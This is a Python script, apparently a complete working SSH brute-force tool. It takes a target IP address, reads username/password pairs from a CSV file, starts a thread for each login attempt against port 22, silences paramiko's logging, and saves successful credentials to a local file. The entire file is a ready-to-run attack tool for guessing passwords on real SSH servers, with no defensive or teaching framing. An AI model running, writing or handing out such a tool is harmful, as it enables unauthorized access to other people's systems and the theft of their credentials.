import csv
import ipaddress
import threading
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception



def ssh_connect(host, username, password):
    ssh_client = SSHClient()

    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
       
        ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)

        with open("credentials_found.txt", "a") as fh:
          
            print(f"Username - {username} and Password - {password} found.")
            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")


def get_ip_address():
    
    while True:
        host = input("Please enter the host ip address: ")
        try:
 
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
           
            print("Please enter a valid ip address.")
            
        


def __main__():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
   
    list_file="passwords.csv"
    host = get_ip_address()
   
    with open(list_file) as fh:
        csv_reader = csv.reader(fh, delimiter=",")
       
        for index, row in enumerate(csv_reader):

            if index == 0:
                continue
            else:
               
                t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1],))

                t.start()
               
                time.sleep(0.2)


            


__main__()
